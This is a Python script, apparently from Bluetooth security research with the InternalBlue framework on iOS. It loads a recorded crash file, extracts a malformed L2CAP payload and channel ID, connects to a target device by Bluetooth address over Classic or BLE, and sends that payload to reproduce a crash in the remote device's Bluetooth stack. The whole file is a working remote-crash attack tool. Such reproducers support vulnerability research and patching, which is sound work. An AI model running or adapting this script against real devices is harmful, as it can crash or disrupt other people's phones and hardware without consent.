import sys
import time
import os
import binascii
import struct

from pwn import *
from internalblue.ioscore import iOSCore
import internalblue.hci as hci
from random import randrange

import InternalBlueL2CAP
from BTConnection import BluetoothConnection

_CLASSIC = 0
_BLE = 1

if len(sys.argv) < 3:
    log.error("USAGE: {} crash_file bd_addr [BLE]".format(sys.argv[0]))
    sys.exit(-1)

crashfile = sys.argv[1]
bd_addr = sys.argv[2].replace(":", "")

# only do BLE if specified
tech = _CLASSIC
if len(sys.argv) == 4:
    log.info("Using BLE")
    tech = _BLE

internalblue = iOSCore(log_level=10)

# let user choose device is more than one is connected
devices = internalblue.device_list()
i = options("Please specify device: ", [d[2] for d in devices], 0)
internalblue.interface = internalblue.device_list()[i][1]

# setup sockets
if not internalblue.connect():
    log.critical("No connection to internalblue device.")
    sys.exit(-1)

connection = BluetoothConnection(internalblue, bytes.fromhex(bd_addr), reconnect=0)
l2cap_mgr = InternalBlueL2CAP.L2CAPManager(connection)

# open crash file
cf = open(crashfile, "r")
crash = cf.read()
cf.close()

# parse crash file
crash = crash.split("\n")
# parse crash message
first = crash[1].find("'") + 1
second = crash[1].find("'", first)
msg = crash[1][first:second]
log.info("Got crash file that should result in the following error: %s", msg)

payload = bytes.fromhex(crash[2])
# parse CID so we can listen to responses if there are any
cid = bytes.fromhex(crash[2])[6:8]
parsed_cid = struct.unpack("h", cid)[0]
log.info("Sending payload: %s, got CID: %d", crash[2], parsed_cid)

def send_l2cap():
    global payload
    # if the payload is very long the MP Ping trick can be used to increase
    # the L2CAP MTU
    internalblue.sendH4(0x02, bytes.fromhex("0B20070003003000F00000"))
    time.sleep(.5)

    ## we need to cut away the first four bytes (handle and length)
    payload = payload[4:]
    # cut away length and CID
    payload = payload[4:]

    l2cap_mgr.sendData(payload, parsed_cid)

    # wait a bit before exiting
    time.sleep(6)
    sys.exit(1)

connection.connection_type = tech
connection.connection_callback = send_l2cap
connection.connect()

time.sleep(120)

